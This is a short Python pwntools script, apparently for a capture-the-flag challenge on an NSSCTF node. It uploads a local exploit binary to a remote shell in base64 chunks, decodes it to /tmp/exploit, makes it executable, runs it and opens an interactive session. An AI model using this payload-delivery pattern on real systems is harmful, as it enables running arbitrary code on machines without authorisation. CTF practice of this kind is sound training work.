from pwn import *
import base64
#context.log_level = "debug"

with open("./exp", "rb") as f:
	exp = base64.b64encode(f.read())

p = remote("node4.anna.nssctf.cn", 28467)
try_count = 1
while True:
	p.sendline()
	p.recvuntil(b"/ $")
	count = 0
	for i in range(0, len(exp), 0x300):
		p.sendline("echo -n \"" + exp[i:i + 0x300].decode() + "\" >> /tmp/b64_exp")
		count += 1
		log.info("count: " + str(count))

	for i in range(count):
		p.recvuntil(b"/ $")
   
	p.sendline(b"cat /tmp/b64_exp | base64 -d > /tmp/exploit")
	p.sendline(b"chmod +x /tmp/exploit")
	p.sendline(b"/tmp/exploit ")
	break

p.interactive()
